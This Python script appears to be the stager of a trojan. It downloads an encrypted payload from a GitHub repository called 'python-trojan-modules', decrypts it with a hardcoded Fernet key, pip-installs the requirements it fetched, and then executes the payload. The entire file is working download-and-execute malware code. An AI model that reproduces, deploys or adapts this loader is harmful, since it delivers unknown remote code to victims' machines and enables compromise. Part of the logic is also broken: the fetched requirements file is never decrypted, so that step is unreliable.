import requests as requests
import subprocess
from cryptography.fernet import Fernet
from subprocess import call

key = b'8Shjz6mNyel8p7qNCETNEqrxBodA2MZbOtsJ6un79EQ='

payload_url = "https://raw.githubusercontent.com/stephanevdb/python-trojan-modules/main/payload.py.enc"
requirements_url = "https://github.com/stephanevdb/python-trojan-modules/blob/main/requirements.txt.enc"


def decrypt_file(encrypted_file_path, key):
    with open(encrypted_file_path, 'rb') as encrypted_file:
        encrypted_data = encrypted_file.read()
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)
    decrypted_file_path = encrypted_file_path[:-4]  # Remove the '.enc' extension
    with open(decrypted_file_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)
    print("File decrypted successfully.")


if __name__ == '__main__':
    p = requests.get(payload_url, allow_redirects=True)
    open('payload/' + 'payload.py.enc', 'wb').write(p.content)
    r = requests.get(requirements_url, allow_redirects=True)
    open('payload/' + 'requirements.txt', 'wb').write(r.content)

    decrypt_file('payload/' + 'payload.py.enc', key)


    subprocess.run(["pip", "install", "-r", 'payload/' + "requirements.txt"])
    subprocess.run(["python", 'payload/' + "payload.py"])
